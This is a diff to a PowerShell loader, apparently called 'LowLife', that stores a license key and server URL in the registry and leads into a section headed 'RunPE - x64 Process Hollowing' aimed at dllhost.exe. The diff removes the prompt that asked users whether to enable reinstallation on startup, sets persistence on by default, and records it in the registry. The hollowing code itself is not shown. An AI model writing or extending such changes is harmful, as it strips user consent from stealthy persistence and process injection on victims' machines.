@@ -8,7 +8,7 @@
 param (
     [string]$Key    = "",
     [switch]$Silent = $false,
-    [switch]$Persist = $false
+    [switch]$Persist = $true
 )
 $ErrorActionPreference = "Stop"
 
@@ -27,7 +27,14 @@ $HostProcess    = "C:\Windows\System32\dllhost.exe"
 
 # Resolve workspace path safely to prevent system32 registry corruption
 $storedWorkspace = (Get-ItemProperty -Path $KeyRegPath -Name "Workspace" -ErrorAction SilentlyContinue).Workspace
+$storedPersistence = (Get-ItemProperty -Path $KeyRegPath -Name "Persistence" -ErrorAction SilentlyContinue).Persistence
+if ($PSBoundParameters.ContainsKey('Persist')) {
+    # Respect command-line parameter if explicitly provided
+} else {
+    $Persist = $true
+}
 $actualWorkspace = ""
+
 
 if ($scriptRoot -and $scriptRoot -notmatch '(?i)\\system32') {
     $actualWorkspace = $scriptRoot
@@ -116,21 +123,8 @@ if (-not $licenseKey) {
     if ([string]::IsNullOrWhiteSpace($licenseKey)) { Write-Error "Key cannot be empty."; Exit }
 }
 
-# Persistence prompt
-if (-not $Silent -and -not $Persist) {
-    try {
-        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
-        $boxResult = [System.Windows.Forms.MessageBox]::Show("Enable automatic reinstallation on startup?", "LowLife Persistence Option", [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question)
-        if ($boxResult -eq [System.Windows.Forms.DialogResult]::Yes) {
-            $Persist = $true
-        }
-    } catch {
-        if ($Host.Name -eq "ConsoleHost") {
-            Write-Host ""
-            if ((Read-Host "Enable automatic reinstallation on startup? [Y/N]") -match "^[yY]") { $Persist = $true }
-        }
-    }
-}
+# Persistence prompt - automatically enabled
+$userAnswered = $false
 
 # Save key, workspace path, and server URL to registry
 New-Item -Path $KeyRegPath -Force -ErrorAction SilentlyContinue | Out-Null
@@ -138,6 +132,15 @@ Set-ItemProperty -Path $KeyRegPath -Name $KeyRegName -Value $licenseKey -Force
 Set-ItemProperty -Path $KeyRegPath -Name "ServerUrl" -Value $ServerBaseUrl -Force
 if (-not [string]::IsNullOrWhiteSpace($actualWorkspace)) {
     Set-ItemProperty -Path $KeyRegPath -Name "Workspace" -Value $actualWorkspace -Force
+}
+if ($Persist) {
+    Set-ItemProperty -Path $KeyRegPath -Name "Persistence" -Value "Yes" -Force
+} elseif ($PSBoundParameters.ContainsKey('Persist')) {
+    Set-ItemProperty -Path $KeyRegPath -Name "Persistence" -Value "No" -Force
+} elseif ($userAnswered) {
+    Set-ItemProperty -Path $KeyRegPath -Name "Persistence" -Value "No" -Force
+} elseif ($storedPersistence) {
+    Set-ItemProperty -Path $KeyRegPath -Name "Persistence" -Value $storedPersistence -Force
 }
 
 # -- RunPE - x64 Process Hollowing ---------------------------------------------
